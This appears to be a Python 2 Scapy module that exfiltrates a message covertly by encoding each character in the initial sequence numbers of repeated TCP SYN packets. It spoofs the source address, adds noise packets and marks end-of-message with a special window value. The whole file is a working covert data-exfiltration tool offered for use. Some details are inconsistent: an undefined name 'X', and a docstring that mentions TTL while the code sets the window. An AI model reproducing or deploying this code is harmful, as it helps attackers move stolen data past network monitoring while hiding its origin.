"""
This is all the functionality we need to exfiltrate a message by smuggling it
in TCP sequence numbers in SYN packets, much like a SYN stealth scan, execpt
that we're sending SYN packets over and over to the same host.

One advantage of this approach is that we can spoof the source address since we
don't care what happens to the SYN/ACK packets that get sent back.

Todo:
    We should probably modify the server so that it doesn't even send SYN/ACK but
    that might be too low level for this time.

"""

from scapy.all import *

# Yes, it's a magical number!
multiplier = 16777216  # the server will be performing the division

def add_n0ise_iseq(pkt, exfilArrayCharValue):
    """Add noise to the sequence numbers

	Args:
		pkt (Packet): Base IP packet from Scapy
		exfilArrayCharValue (int): The value of the next character
    """
    print '[*] adding n0ise to iseq..'
    #-y = exfilArray[i]
    # Add some randomness
    randy = random.randint(-9999999, 9999999)  # too large will produce error
    pkt.seq = exfilArrayCharValue + randy
    # Signal noisy packet
    pkt.window = int(8182) - random.randint(23, 275)
    try:
        send(pkt)
    except socket.error:
        print "\nERROR: Problem sending packets, are you root?\n"
        exit(0)

def convert_iseq(message):
    """ Convert the message to an array of initial sequence numbers

    Args:
		message (str): The message to be encoded
        multiplier (int): Magical number!

	Returns:
		Array: The converted ordinal array of the message to exfiltrate

	Todo:
		TODO: recover safely from is_32bit(), setting to X for now
    """
    retval = []
    print '[*] converting iseq message: %s' % message
    for char in message:
        c = ord(char)
        # While we are here, might as well generate our SYN packet sequence
        # number.
        exfilChar = c * multiplier
        # Add seq to the global exfilArray.
        if is_32bit(exfilChar):
            print '[+] iseq size OK'
        else:
            print '[-] Warning: iseq int too large %d. Setting to X' % exfilChar
            exfilChar = ord(X) * multiplier
        retval.append(exfilChar)
        print '%s=%d, exfilChar=%d' % (char, c, exfilChar)
    return retval

# Send message using initial sequence numbers. Add noise.
def exfil_iseq(spoof, destination, dstport, message):
    """Send out a message using initial sequence numbers, much
	like an Nmap SYN scan.  Each packet has an initiail sequence
	number that corresponds to a charcter in the message to send.

	Note:
		Initial sequence numbers are 32 bit
		We slow down the sending

	Args:
		spoof (str): The spoofed source IP address
		destination (str): The destination address for the packet
		dstport (int):	The destination port for the packets
		message (str):	The message we want to exfiltrate
        multiplier (int): Magical number!
    """
    i = 0
    exfilMsg = convert_iseq(message)
    pkt = IP(src=spoof, dst=destination) / TCP(dport=dstport, flags='S')
    for c in exfilMsg:
        add_n0ise_iseq(pkt, exfilMsg[i])
        pkt.window = 1337
        pkt.seq = exfilMsg[i]
        # slow our roll
        time.sleep(0.4)
        try:
            print '[window] ' + str(pkt.window)
            send(pkt)
        except socket.error:
            print "\nERROR: Problem sending packets, are you root?\n"
            exit(0)
        i += 1
    send_eom(pkt)


# Does x fit in a 32bit int?
# We need this for iseq
def is_32bit(x):
    bitl = (x).bit_length()
    if bitl <= 32:
        # print '[*] OK: int is 32bit'
        return True
    else:
        # print '[-] Warning: int is too large.'
        return False



# Set the ttl=60 to indicate end-of-message
def send_eom(pkt):
    """Send the last message, encoded with a special TTL to let
	the server know we're done.

	Args:
		pkt (Packet): Scapy packet
    """
    print '[*] Sending End-Of-Message'
    pkt.window = 7331 # It's a magical number!
    send(pkt)
